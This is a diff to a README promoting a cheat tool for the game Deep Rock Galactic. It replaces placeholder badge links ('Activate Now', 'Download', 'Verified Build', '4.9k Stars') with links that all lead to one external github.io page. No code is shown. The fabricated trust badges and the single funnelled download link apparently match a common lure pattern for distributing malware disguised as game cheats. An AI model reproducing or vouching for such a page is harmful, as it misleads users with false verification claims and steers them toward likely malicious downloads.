@@ -31,10 +31,10 @@ In the caves of Hoxxes, every mission is a gamble. The **Deep Rock Galactic Chea
 
   * Save configs for farming runs, combat-heavy missions, or co-op support play.
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐ 4.9k Stars](https://img.shields.io/badge/⭐-4.9k_Stars-green?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?style=for-the-badge\&logo=rocket)](https://deep-rock-galactic-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://deep-rock-galactic-cheat.github.io/.github/)
+[![⭐ 4.9k Stars](https://img.shields.io/badge/⭐-4.9k_Stars-green?style=for-the-badge\&logo=github)](https://deep-rock-galactic-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](https://deep-rock-galactic-cheat.github.io/.github/)
 
 ---
 
@@ -111,9 +111,9 @@ A: The cheat is updated after every Deep Rock Galactic patch to maintain compati
 
 The **Deep Rock Galactic Cheat** lets you mine smarter, fight harder, and progress faster. With customizable tools for combat, farming, and awareness, it transforms every mission into a guaranteed success. Perfect for solo players and private squads who want full control.
 
-[![Community](https://img.shields.io/badge/Community-Join-purple?style=for-the-badge\&logo=discord)](#)
-[![Verified Build](https://img.shields.io/badge/Verified-Build-green?style=for-the-badge\&logo=checkmarx)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
+[![Community](https://img.shields.io/badge/Community-Join-purple?style=for-the-badge\&logo=discord)](https://deep-rock-galactic-cheat.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-green?style=for-the-badge\&logo=checkmarx)](https://deep-rock-galactic-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](https://deep-rock-galactic-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://deep-rock-galactic-cheat.github.io/.github/)
 
 ---
